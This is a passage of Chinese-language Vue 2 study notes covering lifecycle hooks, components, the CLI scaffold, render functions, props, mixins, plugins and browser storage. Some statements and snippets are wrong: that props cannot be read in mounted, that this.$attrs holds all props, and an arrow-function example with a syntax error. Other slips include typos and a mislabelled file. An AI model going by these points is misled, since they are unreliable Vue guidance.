3. **beforeMount（挂载前）**：在挂载开始之前被调用，相关的render函数首次被调用。此阶段Vue开始解析模板，生成虚拟DOM存在内存中，还没有把虚拟DOM转换成真实DOM，插入页面中。所以网页不能显示解析好的内容。
4. **mounted（挂载后）**：在el被新创建的 vm.$el（就是真实DOM的拷贝）替换，并挂载到实例上去之后调用（将内存中的虚拟DOM转为真实DOM，真实DOM插入页面）。此时页面中呈现的是经过Vue编译的DOM，这时在**这个钩子函数中对DOM的操作可以有效，但要尽量避免**。一般在这个阶段进行：开启定时器，发送网络请求，订阅消息，绑定自定义事件等等



5. **beforeUpdate（更新前）**：响应式数据更新时调用，此时虽然响应式数据更新了，但是对应的真实 DOM 还没有被渲染（数据是新的，但页面是旧的，页面和数据没保持同步呢）。
6. **updated（更新后）** ：在由于数据更改导致的虚拟DOM重新渲染和打补丁之后调用。此时 DOM 已经根据响应式数据的变化更新了。调用时，组件 DOM已经更新，所以可以执行依赖于DOM的操作。然而在大多数情况下，**应该避免在此期间更改状态，因为这可能会导致更新无限循环**。该钩子在服务器端渲染期间不被调用。



7. **beforeDestroy（销毁前）**：实例销毁之前调用。这一步，实例仍然完全可用，`this` 仍能获取到实例。在这个阶段一般进行关闭定时器，取消订阅消息，解绑自定义事件。
8. **destroyed（销毁后）**：实例销毁后调用，调用后，Vue 实例指示的所有东西都会解绑定，所有的事件监听器会被移除，所有的子实例也会被销毁。该钩子在服务端渲染期间不被调用。



**3、一个template的细节：**

> 来讲一下图中间大框框的内容

![在这里插入图片描述](https://img-blog.csdnimg.cn/bf970362485848798ab093430b4162b8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qC86Zu354uQ5oCd,size_20,color_FFFFFF,t_70,g_se,x_16)


先判断有没有 **el** 这个配置项，没有就调用 vm.$mount(el)，如果两个都没有就一直卡着，显示的界面就是最原始的容器的界面。有 **el** 这个配置项，就进行判断有没有 template 这个配置项，没有 template 就将 el 绑定的容器编译为 vue 模板，来个对比图。

没编译前的：

![在这里插入图片描述](https://img-blog.csdnimg.cn/d2242a275b1c4abe98fbcf9623ff8152.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qC86Zu354uQ5oCd,size_20,color_FFFFFF,t_70,g_se,x_16)


编译后：

![在这里插入图片描述](https://img-blog.csdnimg.cn/2c59b4bb3820404f87adf366e8582f91.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qC86Zu354uQ5oCd,size_20,color_FFFFFF,t_70,g_se,x_16)




这个 template 有啥用咧？

**第一种情况，有 template：**

如果 el 绑定的容器没有任何内容，就一个空壳子，但在 Vue 实例中写了 template，就会编译解析这个 template 里的内容，生成虚拟 DOM，最后将 虚拟 DOM 转为 真实 DOM 插入页面（其实就可以理解为 template 替代了 el 绑定的容器的内容）。

![在这里插入图片描述](https://img-blog.csdnimg.cn/b6de87cd2e44480a8cbe1ec82b867ca3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qC86Zu354uQ5oCd,size_20,color_FFFFFF,t_70,g_se,x_16)


![在这里插入图片描述](https://img-blog.csdnimg.cn/23762cb8feb340449fb0033abcff0a6d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qC86Zu354uQ5oCd,size_20,color_FFFFFF,t_70,g_se,x_16)



**第二种情况，没有 template：**

没有 template，就编译解析 el 绑定的容器，生成虚拟 DOM，后面就顺着生命周期执行下去。



### 1.20.3 生命周期函数的使用

1、mounted

- **无法获取 vuex、props 数据**，所以不要在这里设置初始化的数据！！！

- 一般在这里使用 vuex 中的 action 函数

- 如果里面有回调函数，那么一律写成**箭头函数**！！！！

  









## 1.21 非单文件组件

非单文件组件定义：一个文件中注册了多个组件，那么组件的html只能写在template里面



### 1.21.1 基本使用

Vue中使用组件的三大步骤：

* 定义组件(创建组件)
* 注册组件
* 使用组件(写组件标签

#### 1.21.1.1 创建组件

```js
// 创建school组件
const school = Vue.extend({
    // html在template里面
    template: `
    <div>
        <h2>学校名称：{{schoolName}}</h2>
        <h2>学校地址：{{address}}</h2>
    </div>
    `,

    data() {
        return {
            schoolName:'尚硅谷',
            address:'北京昌平'
        }
    },
})

// 创建student组件
const student = Vue.extend({
    // html在template里面
    template: `
    <div>
        <h2>学生姓名：{{studentName}}</h2>
        <h2>学生学号：{{number}}</h2>
    </div>
    `,

    data() {
        return {
            studentName:'cocoon',
            number:'2020210832'
        }
    },
})
```

使用Vue.extend(options)创建，其中options和new Vue(options)时传入的那个options几乎一样，但也有点区别；

区别如下：

* el不要写，为什么？ ——— 最终所有的组件都要经过一个vm的管理，由vm中的el决定服务哪个容器。
* data必须写成函数，为什么？ ———— 避免组件被复用时，数据存在引用关系。



#### 1.21.1.2 data必须写成函数

讲解一下面试小问题：data必须写成函数：

这是 js 底层设计的原因：举个例子

> 对象形式

```js
let data = {
    a: 99,
    b: 100
}

let x = data;
let y = data;
// x 和 y 引用的都是同一个对象，修改 x 的值， y 的值也会改变
x.a = 66;
console.loh(x); // a:66 b:100
console.log(y); // a:66 b:100
```

> 函数形式

```js
function data() {
    return {
        a: 99,
        b: 100
    }
}
let x = data();
let y = data();
console.log(x === y); // false
// 我的理解是函数每调用一次就创建一个新的对象返回给他们
```

> 备注：使用template可以配置组件结构。



#### 1.21.1.3 注册组件

* 局部注册：靠new Vue的时候传入components选项
* 全局注册：靠Vue.component('组件名',组件)

> 局部注册

```html
<script>
	//创建vm
    new Vue({
        el: '#root',
        data: {
            msg:'你好啊！'
        },
        //第二步：注册组件（局部注册）
        components: {
            school: school,
            student: student
            // ES6简写形式
            // school,
            // student
        }
    })
</script>
```

> 全局注册

```html
<script>
	//第二步：全局注册组件
	Vue.component('hello', hello)
</script>
```



#### 1.21.1.4 使用组件

写组件标签

```html
<!-- 准备好一个容器-->
<div id="root">
    <hello></hello>
    <hr>
    <h1>{{msg}}</h1>
    <hr>
    <!-- 第三步：编写组件标签 -->
    <school></school>
    <hr>
    <!-- 第三步：编写组件标签 -->
    <student></student>
</div>
```



### 1.21.2 几个注意点

1、关于组件名：

一个单词组成：

* 第一种写法(首字母小写)：school
* 第二种写法(首字母大写)：School

多个单词组成：

* 第一种写法(kebab-case命名)：my-school（需要加引号）
* 第二种写法(CamelCase命名)：MySchool (需要Vue脚手架支持)

>  备注：
>
>  (1).组件名尽可能回避HTML中已有的元素名称，例如：h2、H2都不行。
>
>  (2).可以使用name配置项指定组件在开发者工具中呈现的名字。



2、关于组件标签:

第一种写法：<school></school>

第二种写法：<school/>

> 备注：不用使用脚手架时，<school/>会导致后续组件不能渲染。



3、一个简写方式：

const school = Vue.extend(options) 可简写为：const school = options



### 1.21.3 组件的嵌套

app组件：领导所有组件

```html
<!-- 准备好一个容器-->
<div id="root">

</div>

<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    //定义student组件
    const student = Vue.extend({
        name:'student',
        template:`
				<div>
					<h2>学生姓名：{{name}}</h2>	
					<h2>学生年龄：{{age}}</h2>	
    </div>
			`,
        data(){
            return {
                name:'尚硅谷',
                age:18
            }
        }
    })

    //定义school组件
    const school = Vue.extend({
        name:'school',
        template:`
				<div>
					<h2>学校名称：{{name}}</h2>	
					<h2>学校地址：{{address}}</h2>	
					<student></student>
    </div>
			`,
        data(){
            return {
                name:'尚硅谷',
                address:'北京'
            }
        },
        // 注册组件（局部）
        components:{
            student
        }
    })

    //定义hello组件
    const hello = Vue.extend({
        template:`<h1>{{msg}}</h1>`,
        data(){
            return {
                msg:'欢迎来到尚硅谷学习！'
            }
        }
    })

    //定义app组件
    const app = Vue.extend({
        template:`
				<div>	
					<hello></hello>
					<school></school>
    </div>
			`,
        components:{
            school,
            hello
        }
    })

    //创建vm
    new Vue({
        template:'<app></app>',
        el:'#root',
        //注册组件（局部）
        components:{app}
    })
</script>
```



### 1.21.4 VueComponent

1、vm称为vue的实例对象，那么我们把vc称为VueComponent（组件）的实例对象



2、关于VueComponent的五个点：

* school组件本质是一个名为VueComponent的构造函数，且不是程序员定义的，是Vue.extend生成的。
* 我们只需要写<school/>或<school></school>，Vue解析时会帮我们创建school组件的实例对象，即Vue帮我们执行的：new VueComponent(options)。
* 特别注意：每次调用Vue.extend，返回的都是一个全新的VueComponent！！！！(这个VueComponent可不是实例对象)
* 关于this指向：
  * 组件配置中：data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【VueComponent实例对象】。
  * new Vue(options)配置中：data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【Vue实例对象】。
* VueComponent的实例对象，以后简称vc（也可称之为：组件实例对象）。Vue的实例对象，以后简称vm。



3、vm 管理 vc：

![在这里插入图片描述](https://img-blog.csdnimg.cn/4039bc27eaff4463be9dd5c037993b77.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qC86Zu354uQ5oCd,size_20,color_FFFFFF,t_70,g_se,x_16)



4、一个重要的内置关系

* 一个重要的内置关系：VueComponent.prototype.__proto__ === Vue.prototype
* 为什么要有这个关系：让组件实例对象（vc）可以访问到 Vue原型上的属性、方法。

![在这里插入图片描述](https://img-blog.csdnimg.cn/9f3398cb2cfb4b169951adb53236ad60.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qC86Zu354uQ5oCd,size_20,color_FFFFFF,t_70,g_se,x_16)





## 1.22 单文件组件

单文件组件就是将一个组件的代码写在 .vue 这种格式的文件中，webpack 会将 .vue 文件解析成 html,css,js这些形式。

来做个单文件组件的案例：

**School.vue**

```html
<template>
	<div class="demo">
		<h2>学校名称：{{name}}</h2>
		<h2>学校地址：{{address}}</h2>
		<button @click="showName">点我提示学校名</button>	
	</div>
</template>

<script>
	 export default {
		name:'School',
		data(){
			return {
				name:'尚硅谷',
				address:'北京昌平'
			}
		},
		methods: {
			showName(){
				alert(this.name)
			}
		},
	}
</script>

<style>
	.demo{
		background-color: orange;
	}
</style>
```

**Student.vue**

```html
<template>
	<div>
		<h2>学生姓名：{{name}}</h2>
		<h2>学生年龄：{{age}}</h2>
	</div>
</template>

<script>
	 export default {
		name:'Student',
		data(){
			return {
				name:'张三',
				age:18
			}
		}
	}
</script>
```

**App.vue**

用来汇总所有的组件(大总管)

```html
<template>
	<div>
		<School></School>
		<Student></Student>
	</div>
</template>

<script>
	//引入组件
	import School from './School.vue'
	import Student from './Student.vue'

	export default {
		name:'App',
		components:{
			School,
			Student
		}
	}
</script>
```

**main.js**

在这个文件里面创建 vue 实例

```js
import App from './App.vue'

new Vue({
	el:'#root',
	template:`<App></App>`,
	components:{App},
})
```

**index.html**

在这写 vue 要绑定的容器

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>练习一下单文件组件的语法</title>
	</head>
	<body>
		<!-- 准备一个容器 -->
		<div id="root"></div>
        <script type="text/javascript" src="../js/vue.js"></script>
		<script type="text/javascript" src="./main.js"></script>
	</body>
</html>
```





# 2、vue进阶知识和原理

## 2.1 脚手架

### 2.1.1 安装步骤

设置淘宝镜像：`npm config set registry=https://registry.npm.taobao.org`

> 使用前置：
>
> 第一步(没有安装过的执行)：全局安装 @vue/cli
>
> npm install -g @vue/cli
>
> 第二步：切换到要创建项目的目录，然后使用命令创建项目
>
> vue create xxxxx
>
> 第三步：启动项目
>
> npm run serve
>
> 项目地址：（默认打开public/index.html）
>
> http://localhost:8080/

### 2.1.2 脚手架文件结构

```
├── node_modules 
├── public
│   ├── favicon.ico: 页签图标
│   └── index.html: 主页面
├── src
│   ├── assets: 存放静态资源
│   │   └── logo.png
│   │── component: 存放组件
│   │   └── HelloWorld.vue
│   │── App.vue: 汇总所有组件
│   │── main.js: 入口文件
├── .gitignore: git版本管制忽略的配置
├── babel.config.js: babel的配置文件
├── package.json: 应用包配置文件 
├── README.md: 应用描述文件
├── package-lock.json：包版本控制文件
```

查看第三方库的所有版本：`view webpack versions`



### 2.1.3 脚手架demo

**1、components:**

就直接把单文件组件的 School.vue 和 Student.vue 两个文件直接拿来用，不需要修改。

Student.vue：

```vue
<template>
	<div class="demo">
		<h2>学校名称：{{name}}</h2>
		<h2>学校地址：{{address}}</h2>
		<button @click="showName">点我提示学校名</button>	
	</div>
</template>

<script>
	 export default {
		// 组件名
		name:'School',

		data(){
			return {
				name:'尚硅谷',
				address:'北京昌平'
			}
		},
		
		methods: {
			showName(){
				alert(this.name)
			}
		},
	}
</script>

<style>
</style>
```



**2、App.vue:**

引入这两个组件，注册一下这两个组件，再使用。

```vue
<template>
    <div>
        <!-- 常规写法 -->
        <School></School>
        <!-- 简化写法 -->
        <School/>
    </div>
</template>

<script>
import School from './components/School.vue';
import Student from './components/Student.vue';

export default {
    name: 'App',
    
    components: {
        School,
        Student
    }
}
</script>
```



**3、main.js:**

入口文件  固定模板

```js
import Vue from 'vue'
import App from './App.vue'

Vue.config.productionTip = false

new Vue({
    render: h => h(App)
}).$mount('#app')
```



### 2.1.4 render函数

接下来就要详细讲解 main.js 中的 render 函数

> 插入一个小知识：

使用 import 导入第三方库的时候不需要 加 './'

导入我们自己写的：

```js
import App from './App.vue'
```

导入第三方的

```js
import Vue from 'vue'
```

不需要在 from 'vue' 加 `'./'` 的原因是第三方库 node_modules 人家帮我们配置好了。

我们通过 import 导入第三方库，在第三方库的 package.json 文件中确定了我们引入的是哪个文件

![在这里插入图片描述](https://img-blog.csdnimg.cn/de478c338b1643d4898b8eddbf489197.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qC86Zu354uQ5oCd,size_20,color_FFFFFF,t_70,g_se,x_16)


通过 module 确定了我们要引入的文件。

> 回到 render 函数

之前的写法是这样：

```js
import App from './App.vue'

new Vue({
	el:'#root',
	template:`<App></App>`,
	components:{App},
})
```

如果这样子写，运行的话会引发如下的报错

![在这里插入图片描述](https://img-blog.csdnimg.cn/b2b8ecbfb1784360a12057d3c019a726.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qC86Zu354uQ5oCd,size_20,color_FFFFFF,t_70,g_se,x_16)


报错的意思是，是在使用运行版本的 vue ，没有模板解析器。

从上面的小知识可以知道，我们引入的 vue 不是完整版的，是残缺的（为了减小vue的大小）。所以残缺的vue.js 只有通过 render 函数才能把项目给跑起来。

来解析一下render

```js
// render最原始写的方式
// render是个函数，还能接收到参数a
// 这个 createElement 很关键，是个回调函数
new Vue({
  render(createElement) {
      console.log(typeof createElement);
      // 这个 createElement 回调函数能创建元素
      // 因为残缺的vue 不能解析 template，所以render就来帮忙解决这个问题
      // createElement 能创建具体的元素
      return createElement('h1', 'hello')
  }
}).$mount('#app')

```

![在这里插入图片描述](https://img-blog.csdnimg.cn/4c32e5e48f2d493a94976a4810abc5fd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qC86Zu354uQ5oCd,size_20,color_FFFFFF,t_70,g_se,x_16)


因为 render 函数内并没有用到 this，所以可以简写成箭头函数。

```js
new Vue({
  // render: h => h(App),
  render: (createElement) => {
    return createElement(App)
  }
}).$mount('#app')
```

再简写：

```js
new Vue({
  // render: h => h(App),
  render: createElement => createElement(App)
}).$mount('#app')
```

最后把 createElement 换成 h 就完事了。

算啦算啦，把简写都整理一遍吧，js里的简写确实多哇。

对象内写方法最原始的：

```js
let obj = {
    name: 'aaa',
    work: function (salary) {
        return '工资' + salary;
    }
}
```

ES6 简化版：

```js
let obj = {
    name: 'aaa',
    work(salary) {
        return '工资' + salary;
    }
}
```

箭头函数简化版:

```js
let obj = {
    name: 'aaa',
    work: (salary) => {
        return '工资' + salary;
    }
}
```

箭头函数再简化（最终版）：

```js
// 只有一个参数就可以把圆括号去了，函数体内部只有一个 return 就可以把大括号去掉，return去掉
let obj = {
    name: 'aaa',
    work: salary => '工资' + salary;
}
```

这样就可以理解 render 函数的简写方式了。

来个不同版本 vue 的区别

* vue.js与vue.runtime.xxx.js的区别：
  * vue.js是完整版的Vue，包含：核心功能+模板解析器。
  * vue.runtime.xxx.js是运行版的Vue，只包含：核心功能；没有模板解析器。
* 因为vue.runtime.xxx.js没有模板解析器，所以不能使用template配置项，需要使用render函数接收到的createElement函数去指定具体内容。



### 2.1.5 修改脚手架的默认配置

* 使用vue inspect > output.js可以查看到Vue脚手架的默认配置。
* 使用vue.config.js可以对脚手架进行个性化定制，详情见：https://cli.vuejs.org/zh

推荐修改的配置有：

1、关闭eslint校验:  

- `lintOnSave: false`
- 在设置中搜索`eslint` 并关闭检查即可



### 2.1.6 脚手架中的index.html

```html
<!DOCTYPE html>
<html lang="">
  <head>
    <meta charset="utf-8">
	<!-- 针对IE浏览器的一个特殊配置，含义是让IE浏览器以最高的渲染级别渲染页面 -->
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
	<!-- 开启移动端的理想视口 -->
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
	<!-- 配置页签图标 -->
    <link rel="icon" href="<%= BASE_URL %>favicon.ico">
	<!-- 引入第三方样式 -->
	<link rel="stylesheet" href="<%= BASE_URL %>css/bootstrap.css">
	<!-- 配置网页标题 -->
    <title>硅谷系统</title>
  </head>
  <body>
		<!-- 当浏览器不支持js时noscript中的元素就会被渲染 -->
    <noscript>
      <strong>We're sorry but <%= htmlWebpackPlugin.options.title %> doesn't work properly without JavaScript enabled. Please enable it to continue.</strong>
    </noscript>
		<!-- 容器 -->
    <div id="app"></div>
    <!-- built files will be auto injected -->
  </body>
</html>

```



## 2.2 vue 进阶知识点

### 2.2.1 ref 属性

* 被用来给元素或子组件注册引用信息（id的替代者）
* 应用在html标签上获取的是**真实DOM元素**，应用在组件标签上是**组件实例对象**（vc）
* 一个 ref 属性只能指向一个DOM元素，不能指向多个
* 使用方式：
  * 打标识：```<h1 ref="xxx">.....</h1>```或 ```<School ref="xxx"></School>```
  * 获取：```this.$refs.xxx```

> 具体案例

```html
<template>
	<div>
		<h1 v-text="msg" ref="title"></h1>
		<button ref="btn" @click="showDOM">点我输出上方的DOM元素</button>
		<School ref="sch"/>
	</div>
</template>

<script>
	//引入School组件
	import School from './components/School'

	export default {
		name:'App',
		components:{School},
		data() {
			return {
				msg:'欢迎学习Vue！'
			}
		},
		methods: {
			showDOM(){
				console.log(this.$refs.title) //真实DOM元素
				console.log(this.$refs.btn) //真实DOM元素
				console.log(this.$refs.sch) //School组件的实例对象（vc）
			}
		},
	}
</script>

```



### 2.2.2 props 配置

- 让子组件接收父组件传过来的参数   
- props 参数不可修改，不要在 data、mounted 使用
- 可以在 html 、computed 中使用
- 参数不要取内置属性名（如key、ref）
- 参数直接变成组件内置属性
- **子组件中 `this.$attrs` 可以得到所有`props` 参数**



1、传递数据：

App.vue:

- 如果加冒号`: (v-bind:)`，则里面填写js语句
- 如果不加冒号`:`，默认为字符串

```html
<Student :name="'cocoon'" sex="man" :age="18"/>
```



2、接收数据：

1. 第一种方式（只接收）：```props:['name'] ```

2. 第二种方式（限制类型）：```props:{name:String}```

3. 第三种方式（限制类型、限制必要性、指定默认值）：

Student.vue

```js
// 简单接收参数
props: ['name','age','sex'],

// 指定类型接收
props: {
   'name': String,
   'age': Number,
   'sex': String
}
   
// 完整版接收
props:{
	name:{
       type:String, //类型
       required:true, //必要性
       default:'老王' //默认值
	}
}
```

```html
<template>
	<div>
		<h2>学生姓名：{{myName}}</h2>
		<h2>学生年龄：{{age}}</h2>
		<h2>学生性别：{{sex}}</h2>

	</div>
</template>
```



3、如果要修改的话：直接在data中赋值

```js
data(){
    return {
        // props优先级更高 可直接传入
        myName: this.name,
    }
},
```



### 2.2.3 mixins 配置

混入 (mixin) 提供了一种非常灵活的方式，来分发 Vue 组件中的 **JS 部分**可复用功能。一个混入对象可以包含任意组件选项。当组件使用混入对象时，所有混入对象的选项将被“混合”进入该组件本身的选项。

1、当data、methods等配置混入时，**以本身已经设置的为主**；

2、当mounted配置混入时，会同时应用 ，但是**混入的优先执行**；



#### 2.2.3.1 mixins 的使用

- mixin.js：

```js
// 公用的配置

export const mixin = {
    methods: {
        showName(){
            console.log(this.name);
        }
    },

    mounted() {
        console.log('生命周期');
    },

}
```

- 组件中引入
```vue
<template>
	<div class="demo">
		<h2>学校名称：{{name}}</h2>
		<h2>学校地址：{{address}}</h2>
		<button @click="showName">点我</button>	
	</div>
</template>

<script>
	// 引入混合
	import { mixin } from '../mixin';

	 export default {
		// 组件名
		name:'School',

		data(){
			return {
				name:'尚硅谷',
				address:'北京昌平'
			}
		},
		
		// mixin配置
		mixins: [mixin],
	}
</script>

<style>
</style>
```



#### 2.2.3.2 mixin 冲突

1、data数据冲突

数据对象在内部会进行递归合并，并在发生冲突时以组件数据优先。

```js
var mixin = {
  data: function () {
    return {
      message: 'hello',
      foo: 'abc'
    }
  }
}

new Vue({
  mixins: [mixin],
  data: function () {
    return {
      message: 'goodbye',
      bar: 'def'
    }
  },
  created: function () {
    console.log(this.$data)
    // => { message: "goodbye", foo: "abc", bar: "def" }
  }
})
```



2、生命周期函数冲突

同名钩子函数将合并为一个数组，因此都将被调用。另外，混入对象的钩子将在组件自身钩子**之前**调用。

```js
var mixin = {
  created: function () {
    console.log('混入对象的钩子被调用')
  }
}

new Vue({
  mixins: [mixin],
  created: function () {
    console.log('组件钩子被调用')
  }
})

// => "混入对象的钩子被调用"
// => "组件钩子被调用"
```



3、其他配置项冲突

值为对象的选项，例如 `methods`、`components` 和 `directives`，将被合并为同一个对象。两个对象键名冲突时，取组件对象的键值对。

```js
var mixin = {
  methods: {
    foo: function () {
      console.log('foo')
    },
    conflicting: function () {
      console.log('from mixin')
    }
  }
}

var vm = new Vue({
  mixins: [mixin],
  methods: {
    bar: function () {
      console.log('bar')
    },
    conflicting: function () {
      console.log('from self')
    }
  }
})

vm.foo() // => "foo"
vm.bar() // => "bar"
vm.conflicting() // => "from self"
```

> 全局混入不建议使用



### 2.2.4 plugin 插件

插件通常用来为 Vue 添加全局功能。插件的功能范围没有严格的限制。基于vue2的使用：

#### 2.2.4.1 plugin.js

- 定义插件：

```js
对象.install = function (Vue, options) {
    // 1. 添加全局过滤器
    Vue.filter(....)

    // 2. 添加全局指令
    Vue.directive(....)

    // 3. 配置全局混入(合)
    Vue.mixin(....)

    // 4. 添加实例方法
    Vue.prototype.$myMethod = function () {...}
    Vue.prototype.$myProperty = xxxx
}
```

- 具体案例：

```js
export default {
    install(Vue, x, y, z) {
        console.log(x, y, z)
        //全局过滤器
        Vue.filter('mySlice', function (value) {
            return value.slice(0, 4)
        })

        //定义全局指令
        Vue.directive('fbind', {
            //指令与元素成功绑定时（一上来）
            bind(element, binding) {
                element.value = binding.value
            },
            //指令所在元素被插入页面时
            inserted(element, binding) {
                element.focus()
            },
            //指令所在的模板被重新解析时
            update(element, binding) {
                element.value = binding.value
            }
        })

        //定义混入
        Vue.mixin({
            data() {
                return {
                    x: 100,
                    y: 200
                }
            },
        })

        //给Vue原型上添加一个方法（vm和vc就都能用了）
        Vue.prototype.hello = () => { alert('你好啊aaaa') }
    }
}
```



#### 2.2.4.2 main.js

通过全局方法 `Vue.use()` 使用插件。它需要在你调用 `new Vue()` 启动应用之前完成：

```js
// 调用 `MyPlugin.install(Vue)`
Vue.use(MyPlugin)

new Vue({
  // ...组件选项
})
```

本质：包含install方法的一个对象，install的第一个参数是Vue，第二个以后的参数是插件使用者传递的数据。

然后就可以在别的组件使用插件里的功能了。

```js
// 引入插件
import plugin from './plugin'

// 使用插件
Vue.use(plugin)
```





### 2.2.5 scoped样式

1. 作用：让样式在局部生效，防止冲突。
2. 写法：```<style scoped>```

```vue
<style scoped>

</style>
```



less案例:

下载less-loader、less：`npm i less-loader less `

```vue
<style lang="less" scoped>
	.demo{
		background-color: pink;
		.atguigu{
			font-size: 40px;
		}
	}
</style>
```






## 2.3 浏览器本地存储

### 2.3.1 Cookie

Cookie是最早被提出来的本地存储方式，在此之前，服务端是无法判断网络中的两个请求是否是同一用户发起的，为解决这个问题，Cookie就出现了。Cookie 是存储在用户浏览器中的一段不超过 4 KB 的字符串。它由一个名称（Name）、一个值（Value）和其它几个用 于控制 Cookie 有效期、安全性、使用范围的可选属性组成。不同域名下的 Cookie 各自独立，每当客户端发起请求时，会自动把当前域名下所有未过期的 Cookie 一同发送到服务器。



**Cookie的特性：**

- Cookie一旦创建成功，名称就无法修改
- Cookie是无法跨域名的，也就是说a域名和b域名下的cookie是无法共享的，这也是由Cookie的隐私安全性决定的，这样就能够阻止非法获取其他网站的Cookie
- 每个域名下Cookie的数量不能超过20个，每个Cookie的大小不能超过4kb
- 有安全问题，如果Cookie被拦截了，那就可获得session的所有信息，即使加密也于事无补，无需知道cookie的意义，只要转发cookie就能达到目的
- Cookie在请求一个新的页面的时候都会被发送过去



**Cookie 在身份认证中的作用**

客户端第一次请求服务器的时候，服务器通过响应头的形式，向客户端发送一个身份认证的 Cookie，客户端会自动 将 Cookie 保存在浏览器中。

随后，当客户端浏览器每次请求服务器的时候，浏览器会自动将身份认证相关的 Cookie，通过请求头的形式发送给 服务器，服务器即可验明客户端的身份。


![在这里插入图片描述](https://img-blog.csdnimg.cn/e29b7e0bef784bc5b6b8ed50b0d8a509.png)



**Cookie 不具有安全性**

由于 Cookie 是存储在浏览器中的，而且浏览器也提供了读写 Cookie 的 API，因此 Cookie 很容易被伪造，不具有安全 性。因此不建议服务器将重要的隐私数据，通过 Cookie 的形式发送给浏览器。

> 注意：千万不要使用 Cookie 存储重要且隐私的数据！比如用户的身份信息、密码等。


### 2.3.2 Session

Session是另一种记录客户状态的机制，不同的是Cookie保存在客户端浏览器中，而Session保存在服务器上。客户端浏览器访问服务器的时候，服务器把客户端信息以某种形式记录在服务器上。这就是Session。客户端浏览器再次访问时只需要从该Session中查找该客户的状态就可以了session是一种特殊的cookie。cookie是保存在客户端的，而session是保存在服务端。

**为什么要用session**
由于cookie 是存在用户端，而且它本身存储的尺寸大小也有限，最关键是用户可以是可见的，并可以随意的修改，很不安全。那如何又要安全，又可以方便的全局读取信息呢？于是，这个时候，一种新的存储会话机制：session 诞生了

**session原理**
当客户端第一次请求服务器的时候，服务器生成一份session保存在服务端，将该数据(session)的id以cookie的形式传递给客户端；以后的每次请求，浏览器都会自动的携带cookie来访问服务器(session数据id)。
>图示：

![在这里插入图片描述](https://img-blog.csdnimg.cn/18768cbd3ece4e73b98c8e3be8cec422.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qC86Zu354uQ5oCd,size_20,color_FFFFFF,t_70,g_se,x_16)
>session我觉得可以简单理解为一个表，根据cookie传来的值查询表中的内容

**session 标准工作流程**

![在这里插入图片描述](https://img-blog.csdnimg.cn/10472e8e03924340a452523ae678de02.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaGFuZ2FvMjMz,size_20,color_FFFFFF,t_70,g_se,x_16)



我在 node.js 中详细演示了一遍 session 的使用，具体看了另一篇博客：https://blog.csdn.net/hangao233/article/details/123089029



### 2.3.3 LocalStorage

LocalStorage是HTML5新引入的特性，由于有的时候我们存储的信息较大，Cookie就不能满足我们的需求，这时候LocalStorage就派上用场了。



**LocalStorage的优点：**

- 在大小方面，LocalStorage的大小一般为5MB，可以储存更多的信息
- LocalStorage是持久储存，并不会随着页面的关闭而消失，除非主动清理，不然会永久存在
- 仅储存在本地，不像Cookie那样每次HTTP请求都会被携带



**LocalStorage的缺点：**

- 存在浏览器兼容问题，IE8以下版本的浏览器不支持
- 如果浏览器设置为隐私模式，那我们将无法读取到LocalStorage
- LocalStorage受到同源策略的限制，即端口、协议、主机地址有任何一个不相同，都不会访问



**LocalStorage的常用API：**

```js
// 保存数据到 localStorage
localStorage.setItem('key', 'value');

// 从 localStorage 获取数据
let data = localStorage.getItem('key');

// 从 localStorage 删除保存的数据
localStorage.removeItem('key');

// 从 localStorage 删除所有保存的数据
localStorage.clear();

// 获取某个索引的Key
localStorage.key(index)
```



**当value为一个对象时需要用到解析：**

```js
localStorage.setItem('todoList', JSON.stringify(value));
```

```js
todoList: JSON.parse(localStorage.getItem('todoList')) || []
```



**案例：**

```js
// 更新 vuex/home 里的 navList （如果本地存储有就不用发请求）
if(JSON.parse(localStorage.getItem('navList'))) {
    this.$store.state.home.navList = JSON.parse(localStorage.getItem('navList'));
} else {                
    this.$store.dispatch('home/updataNavList');
}
```



**LocalStorage的使用场景:**

- 有些网站有换肤的功能，这时候就可以将换肤的信息存储在本地的LocalStorage中，当需要换肤的时候，直接操作LocalStorage即可
- 在网站中的用户浏览信息也会存储在LocalStorage中，还有网站的一些不常变动的个人信息等也可以存储在本地的LocalStorage中





### 2.3.4 SessionStorage

SessionStorage和LocalStorage都是在HTML5才提出来的存储方案，SessionStorage 主要用于临时保存同一窗口(或标签页)的数据，**刷新页面时不会删除，关闭窗口或标签页之后将会删除这些数据**。



**SessionStorage与LocalStorage对比：**

- SessionStorage和LocalStorage都在**本地进行数据存储**；
- SessionStorage也有同源策略的限制，但是SessionStorage有一条更加严格的限制，SessionStorage**只有在同一浏览器的同一窗口下才能够共享**；
- LocalStorage和SessionStorage **都不能被爬虫爬取**；





**SessionStorage的常用API：**

```js
// 保存数据到 sessionStorage
sessionStorage.setItem('key', 'value');

// 从 sessionStorage 获取数据
let data = sessionStorage.getItem('key');

// 从 sessionStorage 删除保存的数据
sessionStorage.removeItem('key');

// 从 sessionStorage 删除所有保存的数据
sessionStorage.clear();

// 获取某个索引的Key
sessionStorage.key(index)
```



**SessionStorage的使用场景**

